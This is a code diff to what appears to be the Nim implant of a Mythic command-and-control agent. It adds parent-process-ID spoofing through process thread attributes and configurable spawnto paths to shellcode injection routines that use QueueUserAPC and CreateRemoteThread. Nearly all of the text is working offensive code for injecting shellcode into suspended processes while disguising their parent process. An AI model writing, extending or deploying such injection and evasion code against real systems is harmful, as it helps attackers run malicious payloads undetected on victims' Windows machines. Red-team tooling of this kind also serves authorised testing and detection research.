@@ -1,9 +1,38 @@
 import ../config
 import ../utils/mythic_responses
+import ../global_data
 import std/[json, strutils, strformat, base64]
 
 when defined(windows):
   import winim/lean
+  
+  const
+    PROCESS_CREATE_PROCESS = 0x0080
+    PROCESS_QUERY_INFORMATION = 0x0400
+    EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
+  
+  type
+    PROC_THREAD_ATTRIBUTE_LIST = object
+    LPPROC_THREAD_ATTRIBUTE_LIST = ptr PROC_THREAD_ATTRIBUTE_LIST
+    
+    STARTUPINFOEXA = object
+      StartupInfo: STARTUPINFOA
+      lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST
+  
+  proc InitializeProcThreadAttributeList(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST, 
+                                         dwAttributeCount: DWORD, dwFlags: DWORD, 
+                                         lpSize: ptr SIZE_T): WINBOOL
+    {.importc, dynlib: "kernel32.dll", stdcall.}
+  
+  proc UpdateProcThreadAttribute(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST,
+                                dwFlags: DWORD, Attribute: DWORD_PTR, 
+                                lpValue: PVOID, cbSize: SIZE_T,
+                                lpPreviousValue: PVOID, lpReturnSize: ptr SIZE_T): WINBOOL
+    {.importc, dynlib: "kernel32.dll", stdcall.}
+  
+  proc DeleteProcThreadAttributeList(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST): void
+    {.importc, dynlib: "kernel32.dll", stdcall.}
 
 type
   InjectHollowArgs = object
@@ -21,6 +50,81 @@ proc xorDecrypt(data: seq[byte], key: string): seq[byte] =
   for i in 0..<data.len:
     result[i] = data[i] xor byte(key[i mod key.len])
 
+when defined(windows):
+  proc createSuspendedProcess(spawntoPath: string, ppid: uint32): tuple[success: bool, pi: PROCESS_INFORMATION, error: string] =
+    ## Create a suspended process with optional PPID spoofing
+    var pi: PROCESS_INFORMATION
+    
+    if ppid != 0:
+      # PPID spoofing - use extended process creation
+      let parentHandle = OpenProcess(PROCESS_CREATE_PROCESS or PROCESS_QUERY_INFORMATION, 0, DWORD(ppid))
+      if parentHandle == 0:
+        return (false, pi, "Failed to open parent process: " & $GetLastError())
+      
+      # Initialize attribute list
+      var size: SIZE_T = 0
+      discard InitializeProcThreadAttributeList(nil, 1, 0, addr size)
+      
+      var attrList = newSeq[byte](size)
+      let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST](addr attrList[0])
+      
+      if InitializeProcThreadAttributeList(attrListPtr, 1, 0, addr size) == 0:
+        CloseHandle(parentHandle)
+        return (false, pi, "Failed to initialize attribute list: " & $GetLastError())
+      
+      # Update attribute with parent process handle
+      if UpdateProcThreadAttribute(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                   addr parentHandle, SIZE_T(sizeof(HANDLE)), nil, nil) == 0:
+        DeleteProcThreadAttributeList(attrListPtr)
+        CloseHandle(parentHandle)
+        return (false, pi, "Failed to update attribute list: " & $GetLastError())
+      
+      # Create process with extended startup info
+      var siEx: STARTUPINFOEXA
+      siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA).DWORD
+      siEx.lpAttributeList = attrListPtr
+      
+      let success = CreateProcessA(
+        spawntoPath,
+        nil,
+        nil,
+        nil,
+        FALSE,
+        CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT,
+        nil,
+        nil,
+        addr siEx.StartupInfo,
+        addr pi
+      )
+      
+      DeleteProcThreadAttributeList(attrListPtr)
+      CloseHandle(parentHandle)
+      
+      if success == 0:
+        return (false, pi, "Failed to create process with PPID spoofing: " & $GetLastError())
+    else:
+      # Normal process creation without PPID spoofing
+      var si: STARTUPINFOA
+      si.cb = sizeof(STARTUPINFOA).DWORD
+      
+      let success = CreateProcessA(
+        spawntoPath,
+        nil,
+        nil,
+        nil,
+        FALSE,
+        CREATE_SUSPENDED,
+        nil,
+        nil,
+        addr si,
+        addr pi
+      )
+      
+      if success == 0:
+        return (false, pi, "Failed to create process: " & $GetLastError())
+    
+    return (true, pi, "")
+
 proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
   ## Inject shellcode using QueueUserAPC technique
   when defined(windows):
@@ -29,26 +133,22 @@ proc injectViaAPC(shellcode: seq[byte]): tuple[success: bool, error: string] =
       if shellcode.len == 0:
         return (false, "Shellcode is empty (0 bytes)")
       
-      # Start a suspended notepad process
-      var si: STARTUPINFOA
-      var pi: PROCESS_INFORMATION
-      si.cb = sizeof(STARTUPINFOA).DWORD
+      # Get spawnto path based on architecture
+      when hostCPU == "amd64":
+        let (spawntoPath, spawntoArgs) = getSpawntoX64()
+      else:
+        let (spawntoPath, spawntoArgs) = getSpawntoX86()
       
-      let success = CreateProcessA(
-        "C:\\Windows\\System32\\notepad.exe",
-        nil,
-        nil,
-        nil,
-        FALSE,
-        CREATE_SUSPENDED or CREATE_NO_WINDOW,
-        nil,
-        nil,
-        addr si,
-        addr pi
-      )
+      if spawntoPath.len == 0:
+        return (false, "spawnto path is not set for this architecture")
       
-      if success == 0:
-        return (false, "CreateProcessA failed: " & $GetLastError())
+      # Get PPID for spoofing
+      let ppid = getPpid()
+      
+      # Create suspended process with optional PPID spoofing
+      let (success, pi, errorMsg) = createSuspendedProcess(spawntoPath, ppid)
+      if not success:
+        return (false, errorMsg)
       
       # Allocate memory in target process
       let pRemote = VirtualAllocEx(
@@ -103,26 +203,22 @@ proc injectViaCreateRemoteThread(shellcode: seq[byte]): tuple[success: bool, err
       if shellcode.len == 0:
         return (false, "Shellcode is empty (0 bytes)")
       
-      # Start a suspended notepad process
-      var si: STARTUPINFOA
-      var pi: PROCESS_INFORMATION
-      si.cb = sizeof(STARTUPINFOA).DWORD
+      # Get spawnto path based on architecture
+      when hostCPU == "amd64":
+        let (spawntoPath, spawntoArgs) = getSpawntoX64()
+      else:
+        let (spawntoPath, spawntoArgs) = getSpawntoX86()
       
-      let success = CreateProcessA(
-        "C:\\Windows\\System32\\notepad.exe",
-        nil,
-        nil,
-        nil,
-        FALSE,
-        CREATE_SUSPENDED or CREATE_NO_WINDOW,
-        nil,
-        nil,
-        addr si,
-        addr pi
-      )
+      if spawntoPath.len == 0:
+        return (false, "spawnto path is not set for this architecture")
       
-      if success == 0:
-        return (false, "CreateProcessA failed: " & $GetLastError())
+      # Get PPID for spoofing
+      let ppid = getPpid()
+      
+      # Create suspended process with optional PPID spoofing
+      let (success, pi, errorMsg) = createSuspendedProcess(spawntoPath, ppid)
+      if not success:
+        return (false, errorMsg)
       
       # Allocate memory in target process
       let pRemote = VirtualAllocEx(
